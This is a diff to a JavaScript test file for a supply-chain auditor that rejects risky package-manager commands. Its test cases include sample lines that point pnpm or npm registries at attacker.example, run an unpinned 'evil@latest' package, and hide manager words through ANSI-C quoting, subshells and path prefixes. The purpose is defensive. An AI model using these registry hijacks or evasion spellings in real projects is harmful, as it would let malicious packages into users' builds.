@@ -3550,8 +3550,17 @@ test('executable dependency command audit rejects manager lines it cannot read i
       ansi("$'pnpm\\x5fconfig_registry=https://attacker.example/'"),
     ],
     [
-      "$'COREPACK\\x5fENABLE_PROJECT_SPEC=0' corepack pnpm install --frozen-lockfile",
+      "env $'COREPACK\\x5fENABLE_PROJECT_SPEC=0' corepack pnpm install --frozen-lockfile",
       ansi("$'COREPACK\\x5fENABLE_PROJECT_SPEC=0'"),
+    ],
+  ])
+  // Without a wrapper, `$'NAME=value'` is the command word, not an assignment,
+  // so bash runs the expansion rather than setting the variable and corepack;
+  // the guarded name is still caught by its decoded spelling.
+  assertRejectedWith([
+    [
+      "$'COREPACK\\x5fENABLE_PROJECT_SPEC=0' corepack pnpm install --frozen-lockfile",
+      'COREPACK_ variable changes how Corepack picks or checks pnpm: COREPACK_ENABLE_PROJECT_SPEC',
     ],
   ])
   // A guarded variable set through ANSI-C with no manager on the line is still
@@ -4070,9 +4079,25 @@ test('executable dependency command audit reads a path-qualified package manager
     ["'my tools'/pnpm config set registry https://attacker.example/", settings('config')],
     ['./v%/pnpm install --no-frozen-lockfile', option('--no-frozen-lockfile')],
     ["'$HOME'/pnpm config set registry https://attacker.example/", settings('config')],
+    // The line reader runs the npm, npx and Corepack checks too, which the
+    // textual reader's manager regex misses behind these prefixes.
+    ['./v%/npx evil@latest', 'executable package is not pinned to an exact version: evil@latest'],
+    [
+      './c=/corepack use pnpm',
+      'corepack command that changes which pnpm runs is rejected: corepack use',
+    ],
+    [
+      './x@/npm config set registry https://attacker.example/',
+      'npm command that changes settings is rejected: npm config',
+    ],
+    [
+      'node_modules/@pnpm/exe/corepack install -g pnpm@8.6.0',
+      'corepack command that changes which pnpm runs is rejected: corepack install',
+    ],
   ])
   // A manager name is the whole basename of a word, not a fragment of a longer
-  // one, so a quoted sentence or a different program is not a manager line.
+  // one, so a quoted sentence or a different program is not a manager line; and
+  // a manager name that is only an argument is not a manager line either.
   assert.deepEqual(
     auditExecutableDependencyCommands([
       {
@@ -4081,11 +4106,104 @@ test('executable dependency command audit reads a path-qualified package manager
           'echo "pnpm version: $(corepack pnpm --version)"',
           'node_modules/.bin/pnpm-lint run',
           'echo pnpmfile.cjs',
+          'echo https://example.test/npx mutable-url',
+          'echo @scope/npx mutable-package-name',
+          'make https://host/pnpm config set registry https://attacker.example/',
         ],
       },
     ]),
-    { commandCount: 3, errors: [] }
+    { commandCount: 6, errors: [] }
   )
+})
+
+// A subshell runs its body as its own command, so a manager is in command
+// position after an unquoted `(`; shellWordDetails breaks the word there, as
+// the shell does, and every line rule then applies inside the subshell.
+test('executable dependency command audit reads a package manager inside a subshell', () => {
+  const redirection = text => `package manager command line uses a shell redirection: ${text}`
+  const settings = name => `pnpm command that changes settings is rejected: pnpm ${name}`
+  const option = text => `pnpm option is not on the reviewed allowlist: ${text}`
+  const corepack = name =>
+    `corepack command that changes which pnpm runs is rejected: corepack ${name}`
+  const reach = name =>
+    `words passed to the \`${name}\` script reach a package manager it runs; pass none`
+  const scriptCommands = name =>
+    name === 'version-packages' ? ['true && pnpm install --lockfile-only'] : []
+  const rejected = [
+    ['(pnpm >/dev/null config set registry https://attacker.example/)', redirection('>/dev/null')],
+    ['(corepack >/dev/null up)', redirection('>/dev/null')],
+    ['(npm >/dev/null config set registry https://attacker.example/)', redirection('>/dev/null')],
+    [
+      'if (pnpm >/dev/null install --dangerously-allow-all-builds); then :; fi',
+      redirection('>/dev/null'),
+    ],
+    ['(pnpm run version-packages --registry=https://attacker.example/)', reach('version-packages')],
+    // The closing `)` of the extglob `@(x)` must not end pnpm's arguments; the
+    // `--registry` after it is still read as a pnpm option. This exercises the
+    // depth tracking in the textual reader's commandArgumentText.
+    [
+      'shopt -s extglob; (pnpm audit --json @(x) --registry=https://attacker.example/)',
+      option('--registry=https://attacker.example/'),
+    ],
+    ['(pnpm config delete node-linker)', settings('config')],
+    ['(corepack use pnpm@8.6.0)', corepack('use')],
+  ]
+  for (const [command, expected] of rejected) {
+    const { errors } = auditExecutableDependencyCommands(
+      [{ file: 'package.json', commands: [command] }],
+      { scriptCommands }
+    )
+    assert.ok(
+      errors.includes(`package.json: ${expected}`),
+      `${command} must be rejected with "${expected}", got ${JSON.stringify(errors)}`
+    )
+  }
+  // A benign subshell around a reviewed command still passes.
+  assert.deepEqual(
+    auditExecutableDependencyCommands([
+      {
+        file: 'package.json',
+        commands: ['(cd packages/wallet-core && corepack pnpm install --frozen-lockfile)'],
+      },
+    ]),
+    { commandCount: 1, errors: [] }
+  )
+})
+
+// The line reader and pass-through check run on the ANSI-C decoding too, so a
+// manager or script spelled through `$'…'` is read as the shell runs it, even
+// when the original hid the manager word from the line reader.
+test('executable dependency command audit reads a manager spelled through ANSI-C on the line', () => {
+  const redirection = text => `package manager command line uses a shell redirection: ${text}`
+  const corepack = name =>
+    `corepack command that changes which pnpm runs is rejected: corepack ${name}`
+  const reach = name =>
+    `words passed to the \`${name}\` script reach a package manager it runs; pass none`
+  const scriptCommands = name =>
+    name === 'version-packages' ? ['true && pnpm install --lockfile-only'] : []
+  const rejected = [
+    ["flock /tmp/l $'pnpm' >/dev/null install --no-frozen-lockfile", redirection('>/dev/null')],
+    [
+      "nice -n 5 $'pnpm' >/dev/null config set registry https://attacker.example/",
+      redirection('>/dev/null'),
+    ],
+    ["flock /tmp/l $'corepack' >/dev/null up", redirection('>/dev/null')],
+    [
+      "flock /tmp/l $'pnpm' run version-packages --registry=https://attacker.example/",
+      reach('version-packages'),
+    ],
+    ["flock /tmp/l $'corepack' use pnpm@8.6.0", corepack('use')],
+  ]
+  for (const [command, expected] of rejected) {
+    const { errors } = auditExecutableDependencyCommands(
+      [{ file: 'package.json', commands: [command] }],
+      { scriptCommands }
+    )
+    assert.ok(
+      errors.includes(`package.json: ${expected}`),
+      `${command} must be rejected with "${expected}", got ${JSON.stringify(errors)}`
+    )
+  }
 })
 
 // pnpm and npm append the words passed to `run <script>` to the end of the
